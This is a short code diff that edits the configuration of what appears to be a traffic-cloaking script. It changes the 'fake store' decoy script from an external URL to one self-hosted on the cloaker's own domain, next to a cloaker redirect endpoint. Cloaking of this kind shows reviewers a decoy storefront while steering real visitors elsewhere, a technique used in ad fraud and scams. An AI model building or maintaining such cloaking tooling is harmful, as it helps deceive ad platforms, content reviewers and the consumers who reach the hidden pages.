@@ -26,7 +26,7 @@
 
   // ====== CONFIGURATION — EDIT THESE ======
   const CLOAKER_DOMAIN = 'YOUR_DOMAIN'; // e.g., 'tokrwd.vercel.app' or your custom domain
-  const DECOY_SCRIPT = 'https://productpilot.us/checkout.js'; // Fake store script (or replace with your own decoy)
+  const DECOY_SCRIPT = 'https://' + CLOAKER_DOMAIN + '/js/decoy.js'; // Self-hosted fake store generator
   // ========================================
 
   const CLOAKER_URL = 'https://' + CLOAKER_DOMAIN + '/api/r';
